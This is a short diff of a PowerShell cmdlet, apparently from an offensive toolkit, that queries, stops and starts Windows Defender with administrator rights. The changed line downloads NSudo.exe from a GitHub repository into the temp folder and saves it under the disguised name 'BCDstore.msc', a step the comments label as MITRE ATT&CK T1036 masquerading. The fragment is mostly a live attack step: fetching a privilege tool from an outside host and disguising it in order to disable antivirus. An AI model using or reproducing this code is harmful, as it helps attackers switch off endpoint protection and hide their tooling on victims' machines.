@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: administrator privileges
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.2.4
+   PS cmdlet Dev version: v1.2.5
 
 .DESCRIPTION
    This CmdLet Query, Stops, Start Anti-Virus Windows Defender
@@ -204,7 +204,7 @@ If($Action -ieq "Query"){## Query Windows Defender state
 
       ## Download standalone binary from @swagkarna github repository
       # And Masquerade standalone executable to look like one .msc archive { MITRE ATT&CK T1036 }
-      powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe','$Env:TMP\BCDstore.msc') }"
+      powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/NSudo.exe','$Env:TMP\BCDstore.msc') }"
       If(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue){
 
          cd $Env:TMP
